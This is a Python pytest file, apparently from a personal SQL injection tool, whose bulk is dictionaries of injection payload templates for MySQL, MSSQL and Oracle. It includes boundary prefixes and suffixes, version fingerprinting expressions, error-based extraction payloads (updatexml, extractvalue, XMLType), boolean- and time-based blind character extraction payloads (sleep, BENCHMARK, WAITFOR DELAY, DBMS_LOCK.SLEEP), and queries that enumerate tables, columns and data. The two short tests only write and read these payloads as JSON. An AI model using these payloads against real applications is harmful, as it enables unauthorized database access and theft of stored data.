import sys
sys.path.append("..")
from lib.utils.json_file import *
import pytest
import logging
import os


logging.basicConfig(level=logging.DEBUG)
root_dir = "E:\\wadong\\知识点整理\\注入\\xss_sql_detected\\data"
boan_data = {
    "low":
    [{
        "prefix":" ", "suffix":"#[RANDSTR]",},{
        "prefix":"'", "suffix":"--+[RANDSTR]",},{
        "prefix":"'", "suffix":"#[RANDSTR]",},
    ],
    "high":
    [{
    "prefix":"as", "suffix":"",},{
    "prefix":"", "suffix":"ds"},
    ],
    }

# 检测的数据库类型的payload
detected_data = {
    "mysql":[
        {
            "version":"", "expression":"'aa'='a' 'a'"
        },        
        {
            "version":"8.0.0", "expression":"ISNULL(JSON_STORAGE_FREE(NULL))"
        },
        {
            "version":"5.7.0", "expression":"ISNULL(JSON_QUOTE(NULL))"
        },
        {
            "version":"5.6.0", "expression":"ISNULL(VALIDATE_PASSWORD_STRENGTH(NULL))"
        },
        {
            "version":"5.5.0", "expression":"TO_SECONDS(950501)>0"
        },
        {
            "version":"5.0.38", "expression":"@@hostname=@@hostname"
        },        
        {
            "version":"5.0.19", "expression":"@@character_set_filesystem=@@character_set_filesystem"
        },
        {
            "version":"5.0.11", "expression":"[RANDNUM]=(SELECT [RANDNUM] FROM DUAL WHERE [RANDNUM1]!=[RANDNUM2])"
        },
        {
            "version":"5.0.6", "expression":"@@div_precision_increment=@@div_precision_increment"
        },
        {
            "version":"5.0.3", "expression":"@@automatic_sp_privileges=@@automatic_sp_privileges"
        },
        {
            "version":"5.0.2", "expression":"DATABASE() LIKE SCHEMA()"
        },
        {
            "version":"5.0.0", "expression":"STRCMP(LOWER(CURRENT_USER()), UPPER(CURRENT_USER()))=0"
        },
        {
            "version":"4.1.11", "expression":"3=(SELECT COERCIBILITY(USER()))"
        },
        {
            "version":"4.1.1", "expression":"2=(SELECT COERCIBILITY(USER()))"
        },
        {
            "version":"4.0.6", "expression":"CURRENT_USER()=CURRENT_USER()"
        },],

    "oracle":
        [
            "LENGTH(SYSDATE)=LENGTH(SYSDATE)", "NVL(RAWTOHEX([RANDNUM1]),[RANDNUM1])=RAWTOHEX([RANDNUM1])", "'aa'='a'||'a'"
        ],

    "mssql":[
        {
            "version":"", "expression":"'aa'='a'+'a'"
        },
        {
            "version":"2017", "expression":"TRIM(NULL) IS NULL"
        },
        {
            "version":"2016", "expression":"ISJSON(NULL) IS NULL"
        },
        {
            "version":"2014", "expression":"CHARINDEX('12.0.2000',@@version)>0"
        },
        {
            "version":"2012", "expression":"CONCAT(NULL,NULL)=CONCAT(NULL,NULL)"
        },
        {
            "version":"2005", "expression":"XACT_STATE()=XACT_STATE()"
        },
        {
            "version":"2000", "expression":"HOST_NAME()=HOST_NAME()"
        },
    ]
}
boolean_data = {
    "low":
    [{
    "db":"mysql", "payload":"and'1'='1'"},{
    "db":"oracle", "payload":"and 1=1 "
    }],
    "high":
    [{

    }]
}

normal_data = {
    "oracle":
        {
            "db_version": "select banner from sys.v_$version where rownum=1", 
            "user_name": "select user from dual",
            "table_count": "select count(table_name) from user_tables",
            "table_name": "select table_name from user_tables where rownum=1 and table_name<>'USERS'",
            "column_count": "select count(table_name) from user_tables",
            "column_name": "select column_name from user_tab_columns where rownum=1 and table_name='[TABLE_NAME]'",
            "data": "select [COLUMN_NAME] from [TABLE_NAME] where rownum=1",
        },
    "mssql":
        {
            "db_version": "select @@version",
            "db_name": "select db_name()",
            # mssql可以一次性获取所有表名,有中括号括着
            "all_table_name": "select quotename(name) from [DB_MAME]..sysobjects where xtype='U' FOR XML PATH('')",
            "table_count": "select count(name) from test..sysobjects where xtype='U' FOR XML PATH('')",
            "table_name": "select top 1 name from sysobjects where xtype='u'",
            "all_column_name": "select quotename(name) from [DB_NAME]..syscolumns where id =(select id from [DB_NAME]..sysobjects where name='[TABLE_NAME]') FOR XML PATH('')",
            "column_count": "select count(*) from syscolumns where id =(select id from sysobjects where name='[TABLE_NAME]')",
            "column_name": "select top 1 name from syscolumns where id =(select id from sysobjects where name='[TABLE_NAME]')",
            "data": "select [COLUMN_NAME] from [TABLE_NAME] where rownum=1",
        },
    "mysql":
        {
            "db_version": "select version()",
            "db_name": "select database()",
            # 逗号分隔
            "all_table_name": "select group_concat(table_name) from information_schema.tables where table_schema=[DB_NAME]",
            "all_column_name": "select group_concat(column_name) from information_schema.columns where table_name=[TABLE_NAME]",
            "data": "select [COLUMN_NAME] from [TABLE_NAME] where rownum=1"
        }
}

error_data = {
    "mysql": [
        {
            "payload": "and`updatexml`(1,concat(0x23,'[START]',[DATA],'[STOP]'),1)"
        },{
            "payload": "and`extractvalue`(1,concat(0x23,'[START]',[DATA],'[STOP]'))"
        },{
            "payload": "and(SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),('[START]',[DATA],'[STOP]'))a from information_schema.tables group by a)b)"
        },{
            "payload": "and exp(~(SELECT * FROM (SELECT CONCAT('[START]',[DATA],'[STOP]','x'))x))"
        },{
            "payload": "and(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[START]',[DATA],'[STOP]','x'))s), 8446744073709551610, 8446744073709551610)))"
        },{
            "payload": "and JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[START]',[DATA],'[STOP]')) USING utf8)))"
        },{
            "payload": "or`updatexml`(1,concat(0x23,'[START]',[DATA],'[STOP]'),1)"
        },{
            "payload": "or`extractvalue`(1,concat(0x23,'[START]',[DATA],'[STOP]'))"
        },{
            "payload": "or(SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),('[START]',[DATA],'[STOP]'))a from information_schema.tables group by a)b)"
        },{
            "payload": "or exp(~(SELECT * FROM (SELECT CONCAT('[START]',[DATA],'[STOP]','x'))x))"
        },{
            "payload": "or(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[START]',[DATA],'[STOP]','x'))s), 8446744073709551610, 8446744073709551610)))"
        },{
            "payload": "or JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[START]',[DATA],'[STOP]')) USING utf8)))"
        },
    ],
    "mssql": [{
        "payload": "and(7=(('[START]'+[DATA]+'[STOP]')))"
    },{
        "payload": "and(7 IN(('[START]'+[DATA]+'[STOP]')))"
    },{
        "payload": "and(7=CONVERT(INT,(SELECT '[START]'+[DATA]+'[STOP]')))"
    },{
        "payload": "and(7=CONCAT('[START]',[DATA],'[STOP]'))"
    },{
        "payload": "or(7=(('[START]'+[DATA]+'[STOP]')))"
    },{
        "payload": "or(7 IN(('[START]'+[DATA]+'[STOP]')))"
    },{
        "payload": "or(7=CONVERT(INT,(SELECT '[START]'+[DATA]+'[STOP]')))"
    },{
        "payload": "or(7=CONCAT('[START]',[DATA],'[STOP]'))"
    }],

    "oracle": [{
        "payload":"and(7=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[START]'||[DATA]||'[STOP]'||CHR(62))) FROM DUAL))"
    },{
        "payload":"and(7=CTXSYS.DRITHSX.SN(2,('[START]'||[DATA]||'[STOP]')))"
    },{
        "payload":"and(7=DBMS_UTILITY.SQLID_TO_SQLHASH(('[START]'||[DATA]||'[STOP]')))"
    },{
        "payload":"or(7=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[START]'||[DATA]||'[STOP]'||CHR(62))) FROM DUAL))"
    },{
        "payload":"or(7=CTXSYS.DRITHSX.SN(2,('[START]'||[DATA]||'[STOP]')))"
    },{
        "payload":"or(7=DBMS_UTILITY.SQLID_TO_SQLHASH(('[START]'||[DATA]||'[STOP]')))"
    },{
        "payload":"and(7=utl_inaddr.get_host_name('[START]'||[DATA]||'[STOP]'))"
    },{
        "payload":"or(7=utl_inaddr.get_host_name('[START]'||[DATA]||'[STOP]'))"
    }]
}

bool_data = {
    "mysql":[
        {
            "payload":"and(ascii(mid([DATA],[POSITION],1))=[DATANUM])",
        },{
            "payload":"and(ascii(substring([DATA],[POSITION],1))=[DATANUM])",
        },{
            "payload":"and(ascii(substr([DATA],[POSITION],1))=[DATANUM])",
        },{
            "payload":"and(ord(mid([DATA],[POSITION],1))like'[DATANUM]')",
        },{
            "payload":"and(ord(substring([DATA],[POSITION],1))like'[DATANUM]')",
        },{
            "payload":"and(ord(substr([DATA],[POSITION],1))like'[DATANUM]')",
        }
    ],
    "mssql":[
        {
            "payload":"and(ascii(substring([DATA],[POSITION],1))=[DATANUM])",
        },{
            "payload":"and(ascii(substring([DATA],[POSITION],1))like'[DATANUM]')",
        }
    ],
    "oracle":[
        {
            "payload":"and(ascii(substr([DATA],[POSITION],1))=[DATANUM])",
        },{
            "payload":"and(ascii(substr([DATA],[POSITION],1))like'[DATANUM]')",
        }
    ],
}

time_data = {
    "mysql":[
        {
            "payload":"and(if(ascii(mid([DATA],[POSITION],1))=[DATANUM],sleep(4),1))"
        },{
            "payload":"and(elt(ascii(mid([DATA],[POSITION],1))=[DATANUM],sleep(4),1))"
        },{
            "payload":"and(elt(ascii(mid([DATA],[POSITION],1))=[DATANUM],BENCHMARK(24000000,MD5(1)),1))"
        },{
            "payload":"or(if(ascii(mid([DATA],[POSITION],1))=[DATANUM],sleep(4),1))"
        },{
            "payload":"or(elt(ascii(mid([DATA],[POSITION],1))=[DATANUM],sleep(4),1))"
        },{
            "payload":"or(elt(ascii(mid([DATA],[POSITION],1))=[DATANUM],BENCHMARK(24000000,MD5(1)),1))"
        }
    ],
    "mssql":[
        {
            "payload":"and 1=(SELECT (CASE WHEN (ascii(substring([DATA],[POSITION],1))=[DATANUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8) ELSE [RANDNUM] END))"
        },{
            "payload":"or 1=(SELECT (CASE WHEN (ascii(substring([DATA],[POSITION],1))=[DATANUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8) ELSE [RANDNUM] END))"
        },{
            "payload":"IF(ascii(substring([DATA],[POSITION],1))=[DATANUM]) WAITFOR DELAY '0:0:4'"
        },{
            "payload":"and 1=(SELECT (CASE WHEN (ascii(substring([DATA],[POSITION],1))like'[DATANUM]') THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8) ELSE [RANDNUM] END))"
        },{
            "payload":"or 1=(SELECT (CASE WHEN (ascii(substring([DATA],[POSITION],1))like'[DATANUM]') THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8) ELSE [RANDNUM] END))"
        },{
            "payload":"IF(ascii(substring([DATA],[POSITION],1))like'[DATANUM]') WAITFOR DELAY '0:0:4'"
        }
    ],
    "oracle":[
        {
            "payload":"and 1=(SELECT (CASE WHEN (ascii(substr([DATA],[POSITION],1))=[DATANUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 222 END) FROM DUAL)"
        },{
            "payload":"or 1=(SELECT (CASE WHEN (ascii(substr([DATA],[POSITION],1))=[DATANUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 222 END) FROM DUAL)"
        },{
            "payload":"and 1=case when(ascii(substr([DATA],[POSITION],1))=[DATANUM]) then DBMS_PIPE.RECEIVE_MESSAGE(1,3) else 0 end"
        },{
            "payload":"or 1=case when(ascii(substr([DATA],[POSITION],1))=[DATANUM]) then DBMS_PIPE.RECEIVE_MESSAGE(1,3) else 0 end"
        },{
            "payload":"and(BEGIN IF (ascii(substr([DATA],[POSITION],1))=[DATANUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)"
        },{
            "payload":"or(BEGIN IF (ascii(substr([DATA],[POSITION],1))=[DATANUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)"
        }
    ]
}
	
boundaries_data = {
	"low":	
		[{
		"prefix":"'",
		"suffix":"--+[RANDSTR]",
		},
		{
		"prefix":"'",
		"suffix":"#[RANDSTR]",
		},
		{
		"prefix":"",
		"suffix":"",
		},
		{
		"prefix":"",
		"suffix":"--+[RANDSTR]",
		},	
		{
		"prefix":"'",
		"suffix":"and'[RANDNUM]'='[RANDNUM]",
		},	
		{
		"prefix":"')",
		"suffix":"#[RANDSTR]",
		},	
		{
		"prefix":"')",
		"suffix":"--+[RANDSTR]",
		},	
		{
		"prefix":"')",
		"suffix":"and('[RANDNUM]'='[RANDNUM]",
		},	
		{
		"prefix":'"',
		"suffix":'"[RANDNUM]"="[RANDNUM]',
		},	
		{
		"prefix":'"',
		"suffix":"#[RANDSTR]",
		}],	
	
	"high":
		[
		{
		"prefix":")",
		"suffix":"--+[RANDSTR]",
		},
		{
		"prefix":")",
		"suffix":"and([RANDNUM]=[RANDNUM]",
		},
		{
		"level":"high",
		"prefix":'")',
		"suffix":'--+[RANDSTR]',
		},		
		{
		"level":"high",
		"prefix":'")',
		"suffix":'and("[RANDNUM]"="[RANDNUM]',
		},	
		]
}
@pytest.mark.write
def test_write_file():
    logging.getLogger("boundaries_data")
    logging.debug(write_json(os.path.join(root_dir, "test.json"), boan_data))

@pytest.mark.get
def test_get_boundaries_file(file_name = os.path.join(root_dir, "boundaries.json")):
    logging.getLogger(file_name)
    result = get_json(file_name, "low")
    logging.debug(result)
    assert result is not None
    result = get_json(file_name, "high")
    logging.debug(result)
    assert result is not None